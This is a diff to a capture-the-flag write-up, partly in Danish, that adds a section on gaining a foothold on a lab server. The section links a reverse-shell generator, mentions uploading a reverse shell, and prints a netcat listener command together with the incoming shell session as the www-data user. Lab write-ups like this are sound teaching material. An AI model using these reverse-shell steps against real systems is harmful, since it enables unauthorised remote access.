@@ -29,7 +29,21 @@ Men vær beredt, det er ikke til at sige hvad Nissedev har haft gang i...
 
 ### Exploitation
 
-### Getting foothold on the webapp
+### Getting foothold on the server
+
+Favorite revshell generator page [Revshells](https://www.revshells.com/)
+
+![Reverse shell upload](images/reverse-shell.png)
+
+```bash
+nc -lvnp 1337
+Listening on 0.0.0.0 1337
+Connection received on 10.10.20.207 38504
+Linux dangerzone 5.10.0-25-amd64 #1 SMP Debian 5.10.191-1 (2023-08-16) x86_64 GNU/Linux
+23:47:57 up 1:25, 0 users, load average: 0.00, 0.00, 0.00
+USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
 ### Getting fourth flag
 
